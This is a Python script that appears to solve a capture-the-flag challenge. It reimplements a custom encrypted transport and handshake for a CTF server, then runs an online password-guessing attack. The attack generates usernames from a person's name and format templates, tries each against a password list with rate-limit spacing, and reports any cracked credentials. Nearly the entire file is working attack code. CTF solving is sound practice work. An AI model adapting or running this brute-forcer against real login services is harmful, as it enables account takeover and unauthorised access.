import ctypes
import os
import socket
import struct
import sys
import time

HOST = "chals.tisc26.ctf.sg"
PORT = 34151
MASK32 = 0xFFFFFFFF
DELAY_SECONDS = 2.2
ACK = b"You have received the key!"


def step(state):
    temporary = (state[3] ^ (state[3] << 11)) & MASK32
    value = (state[0] ^ (state[0] >> 19) ^ temporary ^ (temporary >> 8)) & MASK32
    state[:] = [value, state[0], state[1], state[2]]
    return value


def make_transport_state(preamble):
    low, high = struct.unpack("<II", preamble)
    state = [
        (0x6C0A3E17 ^ 0x9E3779B9) ^ low,
        ((0x2F91C4B5 + 0x517CC1B7) & MASK32) ^ high,
        0x813D5A29 ^ 0x85EBCA6B,
        (0x4E7F02D3 - 0x3D4D51CB) & MASK32,
    ]
    for _ in range(16):
        step(state)
    return state


def stream(state, length):
    output = bytearray()
    while len(output) < length:
        output.extend(struct.pack("<I", step(state)))
    return bytes(output[:length])


def xor(left, right):
    return bytes(a ^ b for a, b in zip(left, right))


def send(plaintext):
    preamble = os.urandom(8)
    wire = preamble + xor(
        plaintext, stream(make_transport_state(preamble), len(plaintext))
    )
    encrypted_response = bytearray()
    with socket.create_connection((HOST, PORT), timeout=8) as connection:
        connection.sendall(wire)
        connection.settimeout(3)
        while True:
            try:
                chunk = connection.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            encrypted_response.extend(chunk)
    response_key = stream(
        make_transport_state(preamble), len(plaintext) + len(encrypted_response)
    )[len(plaintext):]
    decoded = xor(encrypted_response, response_key)
    return decoded


def frame_body(decoded):
    if len(decoded) < 4:
        return b""
    length = struct.unpack_from("<I", decoded)[0]
    return decoded[4: 4 + length]


def handshake_error(reply):
    if reply[:1] == b"\0" and len(reply) >= 5:
        length = struct.unpack_from("<I", reply, 1)[0]
        return reply[5: 5 + length].decode("utf-8", "replace")
    return None


def rotate_left(value, amount, width):
    amount %= width
    return ((value << amount) | (value >> (width - amount))) & ((1 << width) - 1)


def signed(value, width):
    value &= (1 << width) - 1
    return value - (1 << width) if value & (1 << (width - 1)) else value


def attestation(challenge):
    blob = bytearray()
    for width in (8, 16, 32, 64):
        mask, value = (1 << width) - 1, challenge & ((1 << width) - 1)
        for _ in range(100):
            mixed = sum(
                rotate_left(
                    ((value >> (8 * index)) & 255) ^ ((0x5A * index) & 255), 3, 8
                )
                << (8 * index)
                for index in range(width // 8)
            )
            value = (mixed * (0x9E3779B9 & mask) + 1) & mask
        encoded = value.to_bytes(width // 8, "little")
        blob.extend(encoded + encoded)
    for width, constant in ((8, 0xEF), (16, 0xBEEF)):
        value = challenge & ((1 << width) - 1)
        for _ in range(100):
            value ^= constant
        encoded = value.to_bytes(width // 8, "little")
        blob.extend(encoded + encoded)
    value = struct.unpack("<f", struct.pack("<I", challenge & MASK32))[0]
    multiplier = struct.unpack("<f", struct.pack("<I", 0x3F800347))[0]
    for _ in range(100):
        value = ctypes.c_float(value * multiplier).value
    blob.extend(struct.pack("<f", value) * 2)
    value = struct.unpack("<d", struct.pack("<Q", challenge))[0]
    multiplier = struct.unpack("<d", bytes.fromhex("9bf2d71a0000f03f"))[0]
    for _ in range(100):
        value *= multiplier
    blob.extend(struct.pack("<d", value) * 2)
    for width in (8, 16, 32, 64):
        mask, constant = (1 << width) - 1, {
            8: 0xEF,
            16: 0xBEEF,
            32: 0x1337BEEF,
            64: 0x1337BEEF,
        }[width]
        left = right = challenge & mask
        for _ in range(100):
            left = (rotate_left(left, width // 2, width) ^ constant) & mask
            right = (
                            (signed(right, width) >> (width // 2))
                            ^ (right << (width // 2))
                            ^ constant
                    ) & mask
        blob.extend(
            left.to_bytes(width // 8, "little") + right.to_bytes(width // 8, "little")
        )
    assert len(blob) == 90
    return bytes(blob)


class MT19937:
    def __init__(self, seed):
        self.words = [seed & MASK32] + [0] * 623
        self.index = 624
        for index in range(1, 624):
            previous = self.words[index - 1]
            self.words[index] = (
                                        0x6C078965 * (previous ^ (previous >> 30)) + index
                                ) & MASK32

    def next(self):
        if self.index >= 624:
            for index in range(624):
                combined = (self.words[index] & 0x80000000) | (
                        self.words[(index + 1) % 624] & 0x7FFFFFFF
                )
                self.words[index] = (
                        self.words[(index + 397) % 624]
                        ^ (combined >> 1)
                        ^ (0x9908B0DF if combined & 1 else 0)
                )
            self.index = 0
        value = self.words[self.index]
        self.index += 1
        value ^= value >> 11
        value ^= (value << 7) & 0x9D2C5680
        value ^= (value << 15) & 0xEFC60000
        return (value ^ (value >> 18)) & MASK32


def proof(pair, seed, blob, actions):
    plain_actions = struct.pack(f"<{len(actions)}I", *actions)
    delta = 0
    for byte in struct.pack("<QQ", *pair):
        delta ^= byte
    delta = delta or 0x7A
    rolling, encrypted = seed, bytearray()
    for index, byte in enumerate(plain_actions):
        encrypted.append(byte ^ ((rolling + index) & 255))
        rolling = ((rolling ^ byte) + delta) & MASK32
    count = struct.pack("<I", len(actions))
    covered, digest = struct.pack("<QQ", *pair) + count + encrypted, 5381
    for byte in covered:
        digest = (digest * 33 + byte) & MASK32
    return (
            b"\x03"
            + struct.pack("<I", digest)
            + struct.pack("<QQ", *pair)
            + blob
            + count
            + encrypted
    )


def create_ack_session():
    for _ in range(40):
        hello = send(b"\x01")
        if len(hello) == 37 and hello[0] == 1:
            _, first, second, seed, challenge, _ = struct.unpack("<BQQIQQ", hello)
            pair = (first, second)
            break
        error = handshake_error(hello)
        if error:
            raise RuntimeError(f"handshake rejected by server: {error}")
        time.sleep(3)
    else:
        raise RuntimeError("handshake was not accepted")
    return pair


def load_lines(path, description):
    values = []

    with open(path, encoding="utf-8") as file:
        for line_number, line in enumerate(file, 1):
            text = line.strip()

            if not text or text.startswith("#"):
                continue

            values.append(text)

    if not values:
        raise ValueError(f"{description} file {path!r} contains no entries")

    return values


def generate_usernames(first_name, last_name, formats):
    first = first_name.lower()
    last = last_name.lower()

    replacements = {
        "FIRST": first,
        "LAST": last,
        "F": first[:1],
        "L": last[:1],
    }

    usernames = []
    seen = set()

    for format_string in formats:
        try:
            username = format_string.format_map(replacements)
        except KeyError as error:
            raise ValueError(
                f"Unknown placeholder {error} in format: {format_string!r}"
            )

        # Avoid trying duplicate usernames if two formats happen
        # to generate the same thing.
        if username not in seen:
            seen.add(username)
            usernames.append(username)

    return usernames


def console_login(pair, username, password):
    command = f"login {username} {password}".encode("ascii")
    request = b"\x04" + struct.pack("<QQ", *pair) + command.ljust(256, b"\0")
    return frame_body(send(request))


def main():
    if len(sys.argv) != 5:
        raise SystemExit(
            f"Usage: {sys.argv[0]} FIRST_NAME LAST_NAME passwords.txt formats.txt\n"
        )

    first_name = sys.argv[1]
    last_name = sys.argv[2]
    password_file = sys.argv[3]
    format_file = sys.argv[4]

    passwords = load_lines(password_file, "password")
    formats = load_lines(format_file, "format")

    usernames = generate_usernames(first_name, last_name, formats)

    total_candidates = len(usernames) * len(passwords)

    print(f"First name:  {first_name}")
    print(f"Last name:   {last_name}")
    print(f"Usernames:   {len(usernames)}")
    print(f"Passwords:   {len(passwords)}")
    print(f"Candidates:  {total_candidates}")
    print()

    print("Generated usernames:")
    for username in usernames:
        print(f"  {username}")

    print("\nObtaining session...")
    session_pair = create_ack_session()

    print(
        "ACK received. Checking %d combinations with %.1f second spacing."
        % (total_candidates, DELAY_SECONDS)
    )

    number = 0

    for username in usernames:
        for password in passwords:
            number += 1

            time.sleep(DELAY_SECONDS)

            response = console_login(
                session_pair,
                username,
                password,
            )

            decoded = response.decode("utf-8", "replace")

            print(
                f"[{number}/{total_candidates}] "
                f"{username}:{password} -> {decoded}"
            )

            if decoded != 'Invalid credentials.':
                print(f"CRACKED {username}:{password}")
                exit(0)


if __name__ == "__main__":
    main()
